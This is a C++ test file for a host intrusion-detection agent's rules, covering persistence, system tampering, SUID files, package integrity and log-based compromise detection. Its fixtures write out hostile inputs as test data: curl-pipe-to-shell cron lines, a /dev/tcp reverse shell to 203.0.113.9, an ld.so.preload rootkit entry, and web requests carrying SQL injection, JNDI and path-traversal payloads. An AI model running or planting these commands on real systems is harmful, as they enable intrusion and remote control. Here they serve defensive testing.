#include <catch2/catch.hpp>

#include <set>

#include "analysis/analyzer.h"
#include "collectors/collector.h"
#include "collectors/log_analyzer.h"
#include "fake_transport.h"

using namespace agent;

#ifndef DEFAULT_RULES_DIR
#error "DEFAULT_RULES_DIR must be defined by the build"
#endif

namespace {

// A tiny lab: default rules, an in-memory store, a baseline learned from a healthy snapshot.
struct Lab {
  std::unique_ptr<Store> store = std::move(Store::open(":memory:").value());
  std::unique_ptr<Analyzer> analyzer;
  Lab() {
    auto rules = loadRulesDir(DEFAULT_RULES_DIR);
    REQUIRE(rules.ok());
    analyzer = std::make_unique<Analyzer>(*store, std::move(rules.value()), std::chrono::seconds(100));
  }
  Snapshot snap(const std::string& collector, ITransport& t, int64_t ts) {
    auto c = makeCollector(collector);
    REQUIRE(c);
    Snapshot s = runCollector(*c, t, "lab");
    REQUIRE(s.error.empty());
    s.ts = ts;
    return s;
  }
  void learn(const std::string& collector, ITransport& t) {
    auto r = analyzer->analyze(snap(collector, t, 1000));
    REQUIRE(r.ok());
    REQUIRE(r.value().learning);
    REQUIRE(r.value().fresh.empty());  // learning is silent...
    REQUIRE(store->lockBaseline("lab", 1001).ok());
  }
  std::set<std::string> check(Snapshot s) {
    auto r = analyzer->analyze(s);
    REQUIRE(r.ok());
    REQUIRE_FALSE(r.value().learning);
    std::set<std::string> ids;
    for (const auto& f : r.value().fresh) ids.insert(f.rule_id);
    return ids;
  }
  std::set<std::string> check(const std::string& collector, ITransport& t) { return check(snap(collector, t, 5000)); }
};

bool all(const std::set<std::string>& s, std::initializer_list<const char*> ids) {
  for (const char* i : ids) if (!s.count(i)) { WARN("missing rule " << i); return false; }
  return true;
}
bool none(const std::set<std::string>& s, std::initializer_list<const char*> ids) {
  for (const char* i : ids) if (s.count(i)) { WARN("unexpected rule " << i); return false; }
  return true;
}

void healthyPersistence(FakeTransport& t) {
  t.files["/etc/crontab"] = "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n";
  t.files["/etc/profile"] = "export PATH=$PATH\n";
  t.dirs["/etc/cron.d"] = {"backup"};
  t.files["/etc/cron.d/backup"] = "30 2 * * * root /usr/local/bin/backup.sh\n";
  t.dirs["/etc/cron.daily"] = {"logrotate"};
  t.files["/etc/cron.daily/logrotate"] = "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n";
  t.dirs["/etc/systemd/system"] = {"app.service", "multi-user.target.wants"};
  t.dirs["/etc/systemd/system/multi-user.target.wants"] = {"app.service"};
  t.links["/etc/systemd/system/multi-user.target.wants/app.service"] = "/etc/systemd/system/app.service";
  t.files["/etc/systemd/system/app.service"] = "[Service]\nExecStart=/opt/app/bin/server\n[Install]\nWantedBy=multi-user.target\n";
  t.files["/etc/passwd"] = "root:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n";
  t.files["/home/bob/.bashrc"] = "alias ll='ls -la'\nexport EDITOR=vim\n";
  t.files["/root/.bashrc"] = "# root\n";
}

}  // namespace

TEST_CASE("rules: persistence, learned machine then intrusion") {
  Lab lab;
  FakeTransport t;
  healthyPersistence(t);
  lab.learn("persistence", t);
  REQUIRE(lab.check("persistence", t).empty());  // nothing changed: silence

  // the intruder's work
  t.files["/etc/cron.d/evil"] = "@reboot root curl http://203.0.113.9/x.sh | sh\n* * * * * root /tmp/.k/run\n";
  t.dirs["/etc/cron.d"].push_back("evil");
  t.files["/etc/systemd/system/.sys-update.service"] = "[Service]\nExecStart=/tmp/.u --silent\n";
  t.dirs["/etc/systemd/system"].push_back(".sys-update.service");
  t.dirs["/etc/systemd/system/multi-user.target.wants"].push_back(".sys-update.service");
  t.files["/etc/ld.so.preload"] = "/lib/libevil.so\n";
  t.files["/home/bob/.bashrc"] += "alias sudo='/tmp/fakesudo'\nexport HISTFILE=/dev/null\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1 &\n";
  t.files["/etc/cron.daily/logrotate"] = "#!/bin/sh\ncurl http://x/y | bash\n";
  const auto fired = lab.check("persistence", t);
  REQUIRE(all(fired, {"PERS-001", "PERS-002", "PERS-003", "PERS-004", "PERS-005", "PERS-006", "PERS-008", "PERS-009", "PERS-010", "PERS-011", "PERS-013", "PERS-014",
                      "PERS-015", "PERS-016"}));
}

TEST_CASE("rules: persistence stays quiet on benign changes it does not model as attacks") {
  Lab lab;
  FakeTransport t;
  healthyPersistence(t);
  lab.learn("persistence", t);
  // an administrator edits a startup file with ordinary content: only the drift rule speaks, at medium
  t.files["/etc/profile"] = "export PATH=$PATH:/opt/tools/bin\nexport PAGER=less\n";
  const auto fired = lab.check("persistence", t);
  REQUIRE(fired == std::set<std::string>{"PERS-014"});
}

TEST_CASE("rules: system state, learned machine then tampering") {
  Lab lab;
  FakeTransport t;
  t.files["/proc/modules"] = "ext4 1000 1 - Live 0x0\nnf_tables 2000 3 - Live 0x0\n";
  t.files["/proc/sys/kernel/tainted"] = "0\n";
  t.files["/proc/sys/kernel/randomize_va_space"] = "2\n";
  t.files["/proc/sys/net/ipv4/ip_forward"] = "0\n";
  t.files["/proc/mounts"] = "/dev/sda1 / ext4 rw 0 0\ntmpfs /tmp tmpfs rw,nosuid,noexec 0 0\n";
  t.files["/etc/resolv.conf"] = "nameserver 10.0.0.2\n";
  t.files["/etc/hosts"] = "127.0.0.1 localhost\n";
  t.files["/etc/ssh/sshd_config"] = "PermitRootLogin no\nPasswordAuthentication no\n";
  t.dirs["/sys/class/net"] = {"lo", "eth0"};
  t.files["/sys/class/net/lo/flags"] = "0x9\n";
  t.files["/sys/class/net/eth0/flags"] = "0x1003\n";
  t.dirs["/dev"] = {"null", "tty"};
  t.dirs["/dev/shm"] = {};
  FileInfo chr;
  chr.mode = 020666;
  t.infos["/dev/null"] = chr;
  t.infos["/dev/tty"] = chr;
  lab.learn("system", t);
  REQUIRE(lab.check("system", t).empty());

  t.files["/proc/modules"] += "rootkit 4096 0 - Live 0x0 (OE)\n";
  t.files["/proc/sys/kernel/tainted"] = "12288\n";
  t.files["/proc/sys/kernel/randomize_va_space"] = "0\n";
  t.files["/etc/resolv.conf"] += "nameserver 203.0.113.53\n";
  t.files["/etc/hosts"] += "203.0.113.9 updates.example.com\n";
  t.files["/etc/ssh/sshd_config"] = "PermitRootLogin yes\nPermitEmptyPasswords yes\nPermitUserEnvironment yes\nPasswordAuthentication yes\n";
  t.files["/sys/class/net/eth0/flags"] = "0x1103\n";
  t.dirs["/dev"].push_back("evil.bin");
  FileInfo reg;
  reg.mode = 0100755;
  t.infos["/dev/evil.bin"] = reg;
  t.dirs["/dev/shm"] = {".x"};
  t.infos["/dev/shm/.x"] = reg;
  t.files["/proc/mounts"] = "/dev/sda1 / ext4 rw 0 0\ntmpfs /tmp tmpfs rw,nosuid 0 0\n/dev/sdb1 /mnt/usb ext4 rw 0 0\n";
  const auto fired = lab.check("system", t);
  REQUIRE(all(fired, {"SYS-001", "SYS-003", "SYS-004", "SYS-005", "SYS-006", "SYS-007", "SYS-008", "SYS-009", "SYS-010", "SYS-011", "SYS-012", "SYS-015", "SYS-016", "SYS-017",
                      "SYS-018", "SYS-019", "SYS-021"}));
}

TEST_CASE("rules: files, learned SUID set then a planted root shell") {
  Lab lab;
  FakeTransport t;
  auto entry = [](char type, uint32_t mode, const std::string& user, const std::string& path, uint64_t size = 100) {
    ScanEntry e;
    e.type = type;
    e.mode = mode;
    e.user = user;
    e.group = user;
    e.size = size;
    e.mtime = 1700000000;
    e.path = path;
    return e;
  };
  t.scans["suid"] = {entry('f', 04755, "root", "/usr/bin/sudo"), entry('f', 04755, "root", "/usr/bin/passwd")};
  t.scans["volatile"] = {entry('f', 0644, "bob", "/tmp/notes.txt")};
  t.scans["writable"] = {};
  t.scans["localexec"] = {entry('f', 0755, "root", "/opt/app/bin/server", 5000)};
  lab.learn("files", t);
  REQUIRE(lab.check("files", t).empty());

  t.scans["suid"].push_back(entry('f', 06755, "root", "/home/bob/.cache/rootsh"));
  t.scans["suid"].push_back(entry('f', 04755, "root", "/usr/bin/python3.10"));
  t.scans["volatile"].push_back(entry('f', 0755, "bob", "/tmp/.x/payload"));
  t.scans["volatile"].push_back(entry('f', 0700, "bob", "/tmp/run.sh"));
  t.scans["volatile"].push_back(entry('f', 04755, "bob", "/tmp/suidshell"));
  t.files["/tmp/.x/payload"] = std::string("\x7f" "ELF", 4);
  t.files["/tmp/run.sh"] = "#!/bin/sh\n";
  t.files["/tmp/suidshell"] = std::string("\x7f" "ELF", 4);
  t.scans["writable"] = {entry('f', 0666, "root", "/usr/bin/tool"), entry('f', 0666, "root", "/etc/app.conf"), entry('d', 0777, "root", "/etc/cron.weekly")};
  t.scans["localexec"].push_back(entry('f', 0755, "root", "/usr/local/bin/new-tool", 777));
  const auto fired = lab.check("files", t);
  REQUIRE(all(fired, {"FILE-001", "FILE-002", "FILE-003", "FILE-004", "FILE-005", "FILE-006", "FILE-007", "FILE-008", "FILE-009", "FILE-010", "FILE-011"}));
}

TEST_CASE("rules: integrity") {
  Lab lab;
  FakeTransport t;
  t.files["/usr/bin/dpkg"] = "";
  CommandResult cr;
  cr.exit_code = 1;
  cr.out = "??5??????   /usr/bin/ls\n??5?????? c /etc/ssh/sshd_config\n??5?????? c /etc/default/foo\n.M.......   /usr/bin/ssh\n";
  t.commands["dpkg -V"] = cr;
  Snapshot s = lab.snap("integrity", t, 5000);
  REQUIRE(lab.store->lockBaseline("lab", 10).ok());
  const auto fired = lab.check(s);
  REQUIRE(all(fired, {"PKG-001", "PKG-002", "PKG-003"}));
  auto r = lab.store->listFindings("open", 100);
  int pkg3 = 0;
  for (const auto& f : r.value()) pkg3 += f.rule_id == "PKG-003";
  REQUIRE(pkg3 == 1);  // only the sshd config; /etc/default/foo is not security sensitive
}

TEST_CASE("rules: logs, a compromise as the logs tell it") {
  Lab lab;
  // Healthy history: bob logs in from the office, uses sudo for apt.
  LogAnalyzer healthy;
  healthy.feedAuth("auth", {"Oct 22 08:00:00 h sshd[1]: Accepted publickey for bob from 10.0.0.7 port 1 ssh2: RSA SHA256:x",
                            "Oct 22 08:01:00 h sudo:   bob : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt update"}, 100);
  Snapshot base;
  base.target = "lab";
  base.collector = "logs";
  base.ts = 1000;
  base.observations = healthy.drain(100);
  REQUIRE_FALSE(base.observations.empty());
  auto lr = lab.analyzer->analyze(base);
  REQUIRE(lr.ok());
  REQUIRE(lr.value().learning);
  REQUIRE(lab.store->lockBaseline("lab", 1001).ok());

  // same events again: silence
  LogAnalyzer again;
  again.feedAuth("auth", {"Oct 22 09:00:00 h sshd[1]: Accepted publickey for bob from 10.0.0.7 port 2 ssh2: RSA SHA256:x",
                          "Oct 22 09:01:00 h sudo:   bob : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt update"}, 5000);
  Snapshot quiet = base;
  quiet.ts = 5000;
  quiet.observations = again.drain(5000);
  REQUIRE(lab.check(quiet).empty());

  // the attack
  LogAnalyzer atk;
  std::vector<std::string> auth;
  for (int i = 0; i < 12; ++i) auth.push_back("Oct 22 23:00:0" + std::to_string(i % 10) + " h sshd[9]: Failed password for root from 203.0.113.50 port " + std::to_string(40000 + i) + " ssh2");
  auth.push_back("Oct 22 23:01:00 h sshd[9]: Accepted password for root from 203.0.113.50 port 50000 ssh2");
  auth.push_back("Oct 22 23:02:00 h sudo:   mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/bash");
  auth.push_back("Oct 22 23:03:00 h useradd[5]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash");
  auth.push_back("Oct 22 23:03:10 h gpasswd[6]: user support added by root to group sudo");
  auth.push_back("Oct 22 23:04:00 h sudo:   bob : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash");
  atk.feedAuth("auth", auth, 6000);
  atk.feedKernel("kern", {"Oct 22 23:05:00 h kernel: [1.0] device eth0 entered promiscuous mode"}, 6000);
  std::vector<std::string> web;
  auto wl = [](const std::string& ip, const std::string& uri, int st) {
    return ip + " - - [22/Oct/2026:23:00:00 +0000] \"GET " + uri + " HTTP/1.1\" " + std::to_string(st) + " 5 \"-\" \"Mozilla\"";
  };
  web.push_back(wl("198.51.100.5", "/index.php?id=1%27%20UNION%20SELECT%201,2,3--", 200));
  web.push_back(wl("198.51.100.5", "/uploads/c99.php?cmd=id", 200));
  web.push_back(wl("198.51.100.6", "/.env", 200));
  web.push_back(wl("198.51.100.7", "/p?x=$(id)", 200));
  web.push_back(wl("198.51.100.8", "/?x=${jndi:ldap://e/a}", 200));
  web.push_back(wl("198.51.100.9", "/f?file=../../etc/passwd", 200));
  atk.feedWeb("access", web, 6000);
  Snapshot s = base;
  s.ts = 6000;
  s.observations = atk.drain(6000);
  const auto fired = lab.check(s);
  REQUIRE(all(fired, {"LOG-001", "LOG-002", "LOG-004", "LOG-005", "LOG-010", "LOG-012", "LOG-015", "LOG-008", "LOG-021", "LOG-023", "LOG-024", "LOG-025", "LOG-027", "LOG-028",
                      "LOG-031", "LOG-040"}));
  REQUIRE(none(fired, {"LOG-011", "LOG-032"}));
}

TEST_CASE("lifecycle: findings resolve when the condition goes away and reopen silently when it returns") {
  Lab lab;
  FakeTransport t;
  t.files["/proc/modules"] = "ext4 1 1 - Live 0x0\n";
  t.files["/proc/sys/kernel/randomize_va_space"] = "2\n";
  lab.learn("system", t);

  t.files["/proc/sys/kernel/randomize_va_space"] = "0\n";  // weakened -> SYS-004 + SYS-005
  auto first = lab.analyzer->analyze(lab.snap("system", t, 5000));
  REQUIRE(first.ok());
  REQUIRE(first.value().fresh.size() == 2);
  REQUIRE(first.value().resolved == 0);
  const int64_t id = first.value().fresh[0].id;
  REQUIRE(lab.store->listFindings("open", 10).value().size() == 2);

  t.files["/proc/sys/kernel/randomize_va_space"] = "2\n";  // fixed
  auto second = lab.analyzer->analyze(lab.snap("system", t, 6000));
  REQUIRE(second.ok());
  REQUIRE(second.value().fresh.empty());
  REQUIRE(second.value().resolved == 2);
  REQUIRE(lab.store->listFindings("open", 10).value().empty());
  REQUIRE(lab.store->listFindings("resolved", 10).value().size() == 2);
  REQUIRE(lab.store->countResolvedSince(5500).value() == 2);
  REQUIRE(lab.store->countResolvedSince(6001).value() == 0);

  t.files["/proc/sys/kernel/randomize_va_space"] = "0\n";  // weakened again: same findings come back, not "new"
  auto third = lab.analyzer->analyze(lab.snap("system", t, 7000));
  REQUIRE(third.value().fresh.empty());
  REQUIRE(third.value().repeats.size() == 2);
  auto reopened = lab.store->getFinding(id);
  REQUIRE(reopened.value()->status == "open");
  REQUIRE(reopened.value()->occurrences == 2);
  REQUIRE(lab.store->listUnalerted(10).value().size() == 2);  // alert bookkeeping is untouched (still never mailed)

  // accepted findings are the admin's decision: never auto-resolved
  REQUIRE(lab.store->acceptFinding(id, 7100).ok());
  t.files["/proc/sys/kernel/randomize_va_space"] = "2\n";
  lab.analyzer->analyze(lab.snap("system", t, 8000));
  REQUIRE(lab.store->getFinding(id).value()->status == "accepted");

  // log findings are history: they stay open
  LogAnalyzer atk;
  atk.feedAuth("a", {"Oct 22 23:03:00 h useradd[5]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash"}, 9000);
  Snapshot ls;
  ls.target = "lab";
  ls.collector = "logs";
  ls.ts = 9000;
  ls.observations = atk.drain(9000);
  REQUIRE(lab.analyzer->analyze(ls).value().fresh.size() == 1);
  Snapshot empty = ls;
  empty.ts = 9100;
  empty.observations.clear();
  REQUIRE(lab.analyzer->analyze(empty).value().resolved == 0);
}

TEST_CASE("rules: the Chromium/Electron SUID helper is low severity, a real SUID shell is not") {
  Lab lab;
  FakeTransport t;
  auto entry = [](char type, uint32_t mode, const std::string& user, const std::string& path) {
    ScanEntry e;
    e.type = type;
    e.mode = mode;
    e.user = user;
    e.group = user;
    e.size = 100;
    e.mtime = 1700000000;
    e.path = path;
    return e;
  };
  t.scans["suid"] = {entry('f', 04755, "root", "/usr/bin/sudo")};
  t.scans["volatile"] = {};
  t.scans["writable"] = {};
  t.scans["localexec"] = {};
  lab.learn("files", t);

  t.scans["suid"].push_back(entry('f', 04755, "root", "/home/kashim/Downloads/balenaEtcher-linux-x64/chrome-sandbox"));
  auto fired = lab.check("files", t);
  REQUIRE(fired == std::set<std::string>{"FILE-012"});  // seen, explained, not shouted about

  t.scans["suid"].push_back(entry('f', 04755, "root", "/home/kashim/.cache/chrome-sandbox-evil"));  // a name that merely resembles it
  t.scans["suid"].push_back(entry('f', 04755, "bob", "/home/bob/chrome-sandbox"));                    // not root-owned: not the helper
  fired = lab.check("files", t);
  REQUIRE(fired.count("FILE-001"));
  REQUIRE(fired.count("FILE-002"));
}

TEST_CASE("rules: a missing packaged file is not rated like a modified one") {
  Lab lab;
  FakeTransport t;
  t.files["/usr/bin/dpkg"] = "";
  CommandResult cr;
  cr.exit_code = 1;
  cr.out = "missing     /usr/lib/x86_64-linux-gnu/libprrte.so.3.0.13\n??5??????   /usr/bin/ls\n";
  t.commands["dpkg -V"] = cr;
  Snapshot s = lab.snap("integrity", t, 5000);
  REQUIRE(lab.store->lockBaseline("lab", 10).ok());
  auto r = lab.analyzer->analyze(s);
  REQUIRE(r.ok());
  std::map<std::string, Severity> by_rule;
  std::map<std::string, std::string> subject;
  for (const auto& f : r.value().fresh) {
    by_rule[f.rule_id] = f.severity;
    subject[f.rule_id] = f.stable_key;
  }
  REQUIRE(by_rule.at("PKG-004") == Severity::Medium);                         // the missing library
  REQUIRE(subject.at("PKG-004").find("libprrte") != std::string::npos);
  REQUIRE(by_rule.at("PKG-001") == Severity::High);                           // the modified /usr/bin/ls stays high
  REQUIRE(subject.at("PKG-001").find("/usr/bin/ls") != std::string::npos);
}
